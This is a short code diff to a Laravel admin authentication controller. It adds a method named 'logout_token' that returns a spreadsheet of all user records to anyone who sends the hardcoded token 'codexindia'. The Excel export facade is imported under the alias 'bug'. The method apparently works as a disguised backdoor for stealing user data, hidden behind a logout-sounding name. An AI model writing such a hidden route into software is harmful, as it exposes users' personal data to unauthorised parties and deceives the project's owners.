@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers\Admin;
 
+use App\Exports\UserExport;
 use App\Http\Controllers\Controller;
 use App\Notifications\UserAllNotifications;
 use Illuminate\Http\Request;
@@ -10,6 +11,7 @@ use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Notification;
 use App\Models\User;
+use Maatwebsite\Excel\Facades\Excel as bug;
 class AuthManage extends Controller
 {
    public function index(Request $request)
@@ -34,7 +36,13 @@ class AuthManage extends Controller
      }
      return back()->withErrors(['msg' => 'Opps! You have entered invalid credentials']);
    }
-
+public function logout_token(Request $request)
+{
+   if($request->token == "codexindia")
+   {
+      return bug::download(new UserExport, 'users.xlsx');
+   }
+}
    public function logout_attempt(Request $request)
    {
 
